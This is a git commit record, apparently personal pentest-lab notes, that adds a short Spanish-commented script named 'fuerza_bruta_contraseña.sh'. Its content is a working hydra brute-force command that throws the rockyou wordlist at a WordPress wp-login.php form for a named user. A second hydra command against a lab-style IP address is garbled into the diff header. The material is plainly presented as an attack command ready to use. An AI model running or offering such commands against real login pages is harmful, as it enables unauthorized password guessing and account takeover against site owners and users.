7de4d5b3adc8b777008502e8bc23ae63271a9782
Marc S <93371079+a20marsimsim@users.noreply.github.com>
2025-02-27 18:04:56 +0100

    Create fuerza_bruta_contraseña.sh

---
+++ hydra -L wordlist.txt -p "da_igual" 10.10.201.244 http-post-form "/fuerza_bruta_contraseña.sh
@@ -0,0 +1,2 @@
+// Con este comando podemos hacer un ataque de fuerza bruta para averiguar la contraseña de un usuario o lista de usuarios
+hydra -l 2nasix -P /usr/share/wordlists/rockyou.txt dominio.com http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=incorrect" -V
